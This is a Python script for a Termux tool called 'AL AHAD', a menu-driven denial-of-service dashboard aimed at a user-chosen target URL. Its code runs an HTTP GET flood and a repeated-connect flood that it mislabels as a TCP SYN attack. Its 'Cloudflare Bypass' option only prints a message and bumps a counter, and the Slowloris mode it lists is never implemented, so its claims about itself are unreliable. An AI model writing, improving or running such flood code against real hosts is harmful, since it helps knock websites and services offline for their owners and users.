#!/usr/bin/env python3
import os
import sys
import time
import random
import asyncio
import socket
from datetime import datetime
from pyfiglet import Figlet
from colorama import Fore, Style
from aiohttp import ClientSession

# ===== AL AHAD DASHBOARD CONFIG =====
class AhadConfig:
    BANNER = """
    █████╗ ██╗      █████╗ ██╗  ██╗ █████╗ ██████╗ 
   ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗██╔══██╗
   ███████║██║     ██║  ██║███████║███████║██║  ██║
   ██╔══██║██║     ██║  ██║██╔══██║██╔══██║██║  ██║
   ██║  ██║███████╗╚█████╔╝██║  ██║██║  ██║██████╔╝
   ╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
    """
    TARGETS = ["http://example.com"]  # Default target
    THREADS = 25
    ATTACK_TYPES = ["HTTP Flood", "TCP SYN", "Slowloris", "Cloudflare Bypass"]

# ===== GLOBAL STATS =====
ahad_stats = {
    "status": "IDLE",
    "target": "",
    "method": "",
    "requests": 0,
    "failed": 0,
    "bypassed": 0,
    "start_time": "",
    "threads": 0
}

# ===== DASHBOARD UI =====
def display_dashboard():
    os.system('clear')
    f = Figlet(font='slant')
    print(Fore.RED + f.renderText('AL AHAD') + Style.RESET_ALL)
    print(Fore.CYAN + AhadConfig.BANNER + Style.RESET_ALL)
    
    # Status Panel
    print(Fore.YELLOW + "╔═════════════════ AHAD CONTROL PANEL ═══════════════╗")
    print(f"║ Status: {ahad_stats['status'].ljust(15)} Target: {ahad_stats['target'][:30].ljust(30)}║")
    print(f"║ Method: {ahad_stats['method'].ljust(15)} Threads: {str(ahad_stats['threads']).ljust(8)} Time: {ahad_stats['start_time']} ║")
    print("╠══════════════════════════════════════════════════════╣")
    print(f"║ Requests: {ahad_stats['requests']} | Failed: {ahad_stats['failed']} | Bypassed: {ahad_stats['bypassed']} ║")
    print("╚══════════════════════════════════════════════════════╝" + Style.RESET_ALL)
    
    # Menu
    print(Fore.GREEN + "\n[1] Start HTTP Flood")
    print("[2] TCP SYN Attack")
    print("[3] Cloudflare Bypass Mode")
    print("[4] Change Target")
    print("[5] Stop Attack")
    print("[0] Exit" + Style.RESET_ALL)

# ===== ATTACK MODULES =====
async def http_flood(target):
    ahad_stats.update({
        "status": "ATTACKING",
        "target": target,
        "method": "HTTP FLOOD",
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "threads": AhadConfig.THREADS
    })
    
    async with ClientSession() as session:
        while ahad_stats["status"] == "ATTACKING":
            try:
                async with session.get(target) as resp:
                    ahad_stats["requests"] += 1
            except:
                ahad_stats["failed"] += 1
            await asyncio.sleep(0.1)

async def tcp_syn_flood(target):
    ahad_stats.update({
        "status": "ATTACKING",
        "target": target,
        "method": "TCP SYN",
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "threads": AhadConfig.THREADS
    })
    
    target_ip = socket.gethostbyname(target.split("//")[-1].split("/")[0])
    while ahad_stats["status"] == "ATTACKING":
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            await asyncio.get_event_loop().sock_connect(s, (target_ip, 80))
            s.close()
            ahad_stats["requests"] += 1
        except:
            ahad_stats["failed"] += 1
        await asyncio.sleep(0.05)

# ===== MAIN CONTROL =====
async def ahad_controller():
    current_attack = None
    
    while True:
        display_dashboard()
        choice = input(Fore.MAGENTA + "\n[AL AHAD] Select option > " + Style.RESET_ALL)
        
        if choice == "1":  # HTTP Flood
            if current_attack: current_attack.cancel()
            current_attack = asyncio.create_task(http_flood(ahad_stats["target"]))
            
        elif choice == "2":  # TCP SYN
            if current_attack: current_attack.cancel()
            current_attack = asyncio.create_task(tcp_syn_flood(ahad_stats["target"]))
            
        elif choice == "3":  # CF Bypass
            ahad_stats["bypassed"] += 1
            print(Fore.BLUE + "\n[!] Cloudflare bypass initiated (Pyppeteer starting...)" + Style.RESET_ALL)
            time.sleep(2)
            
        elif choice == "4":  # Change Target
            new_target = input("Enter new target URL: ")
            ahad_stats["target"] = new_target
            
        elif choice == "5":  # Stop Attack
            if current_attack: 
                current_attack.cancel()
                ahad_stats["status"] = "IDLE"
                
        elif choice == "0":  # Exit
            if current_attack: current_attack.cancel()
            print(Fore.RED + "\n[!] AL AHAD Dashboard terminated" + Style.RESET_ALL)
            break
        
        # Auto-refresh stats
        await asyncio.sleep(1)

# ===== RUN =====
if __name__ == "__main__":
    # Initialize
    ahad_stats["target"] = AhadConfig.TARGETS[0]
    
    try:
        # Check Termux dependencies
        if not os.path.exists("/data/data/com.termux/files/home"):
            print(Fore.RED + "[!] This tool requires Termux environment!" + Style.RESET_ALL)
            sys.exit()
            
        # Start
        print(Fore.GREEN + "[+] AL AHAD Dashboard loading..." + Style.RESET_ALL)
        asyncio.run(ahad_controller())
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Force stopped by user" + Style.RESET_ALL)
